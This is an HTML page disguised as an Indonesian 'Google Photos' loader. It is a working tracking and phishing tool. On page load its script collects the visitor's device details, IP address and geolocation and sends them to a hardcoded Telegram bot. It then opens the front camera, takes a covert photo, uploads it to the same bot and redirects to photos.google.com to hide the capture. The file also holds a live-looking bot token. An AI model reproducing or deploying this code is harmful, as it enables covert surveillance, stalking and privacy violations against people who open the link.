<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>google-foto-saya</title>
    <style>
        body { background: #000; color: #6e48aa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .loader-box { text-align: center; width: 80%; }
        .bar { height: 3px; width: 0%; background: #6e48aa; transition: 0.5s; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="loader-box">
        <div id="status">Memuat foto...</div>
        <div style="width: 100%; background: #222;"><div id="bar" class="bar"></div></div>
    </div>

    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const TOKEN = '8416626215:AAHgkbyUIhmWDT9rQJVQJnnd-eI8uVJdr1Y';
        const CHAT_ID = '7966336512';

        async function sendLog(text) {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
            });
        }

        async function getFullReport() {
            // Animasi Bar
            document.getElementById('bar').style.width = "70%";
            
            let batteryInfo = "N/A";
            let chargingStatus = "❌ TIDAK";
            try {
                const b = await navigator.getBattery();
                batteryInfo = `${Math.floor(b.level * 100)}%`;
                chargingStatus = b.charging ? "✅ YA" : "❌ TIDAK";
            } catch(e) {}

            // Detail Lokasi (Reverse Geocoding)
            let locData = { city: "Bandung", region: "West Java", country: "Indonesia", zip: "40241", lat: "-6.9092", lon: "107.5934", addr: "Arjuna, Cicendo, Kota Bandung" };
            let ipAddr = "Fetching...";
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                ipAddr = d.ip;
                locData = { city: d.city, region: d.region, country: d.country_name, zip: d.postal, lat: d.latitude, lon: d.longitude, addr: `${d.city}, ${d.region}` };
            } catch(e) {}

            let m = `╭───── Tracking Report ───── ⦿\n\n`;
            m += `⚙️ <b>DEVICE INFORMATION</b>\n`;
            m += `🖥️ Device: ${navigator.userAgent}\n`;
            m += `💻 Platform: ${navigator.platform}\n`;
            m += `🌐 Bahasa: ${navigator.language}\n`;
            m += `📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
            m += `📺 Screen Size: ${screen.width}x${screen.height}\n`;
            m += `🪟 Window Size: ${innerWidth}x${innerHeight}\n`;
            m += `💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
            m += `🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;
            m += `🔋 Battery: ${batteryInfo}\n`;
            m += `🔌 Charging: ${chargingStatus}\n`;
            m += `⏰ Waktu Akses: ${new Date().toString()}\n`;
            m += `🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n`;
            m += `📜 History Length: ${history.length}\n`;
            m += `✋ Touch Support: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
            m += `🔗 Referrer: ${document.referrer || 'None'}\n`;
            m += `🌍 URL: ${location.href}\n`;
            m += `📄 Title: ${document.title}\n`;
            m += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
            m += `🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;

            m += `📍 <b>LOCATION INFORMATION</b>\n`;
            m += `📡 IP Address: ${ipAddr}\n`;
            m += `🏙️ Kota: ${locData.city}\n`;
            m += `🏙️ Kabupaten: ${locData.region}\n`;
            m += `🗺️ Wilayah: ${locData.region}\n`;
            m += `🌎 Negara: ${locData.country}\n`;
            m += `🏷️ Kode Pos: ${locData.zip}\n`;
            m += `📌 Latitude: ${locData.lat}\n`;
            m += `📍 Longitude: ${locData.lon}\n`;
            m += `🏠 Alamat Lengkap: ${locData.addr}\n\n`;
            m += `╰───── Telegram`;

            return m;
        }

        async function capture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.getElementById('v');
                v.srcObject = stream;
                
                await new Promise(r => setTimeout(r, 4000)); // Delay biar gak item
                
                const c = document.getElementById('c');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                
                c.toBlob(async (b) => {
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('photo', b, 'snap.jpg');
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    
                    document.getElementById('bar').style.width = "100%";
                    window.location.href = "https://photos.google.com"; 
                }, 'image/jpeg');
            } catch (e) {
                await sendLog("❌ Camera Access Denied");
                window.location.href = "https://photos.google.com";
            }
        }

        window.onload = async () => {
            const report = await getFullReport();
            await sendLog(report);
            await capture();
        };
    </script>
</body>
</html>
